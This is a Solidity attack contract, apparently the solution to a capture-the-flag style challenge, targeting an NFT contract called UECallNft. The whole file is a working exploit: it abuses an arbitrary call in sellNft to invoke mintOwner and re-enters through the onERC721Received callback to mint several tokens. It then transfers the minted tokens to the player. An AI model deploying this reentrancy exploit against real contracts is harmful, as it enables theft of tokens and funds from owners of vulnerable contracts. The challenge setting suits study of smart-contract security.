// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.19;

import {UECallNft} from "targets/uecallnft/src/UECallNft.sol"; 
import {ERC721} from 'solmate/tokens/ERC721.sol';
contract ueAttack {
    UECallNft public target;
    address public player;
    uint256 public i = 1;
    constructor (address _player, UECallNft _target) {
        target = _target;
        player = _player;
    }

    function attack() public {
        bytes memory data = abi.encodeWithSelector(UECallNft.mintOwner.selector, address(this)); // Was: player — EOA doesn't trigger onERC721Received callback, so reentrancy never fires
        target.sellNft(i, address(target), data);
    }

    function transferToPlayer() public {
        uint256 startId = target.id() - 4; // first minted id in the reentrancy loop
        for (uint256 j = startId; j <= target.id(); j++) {
            target.transferFrom(address(this), player, j);
        }
    }
    
    function onERC721Received(
        address operator,
        address from,
        uint256 id,
        bytes calldata data
    ) external returns (bytes4) {
        ++i;
        if (i < 6) {
            attack();
        }
        return this.onERC721Received.selector;
    }
}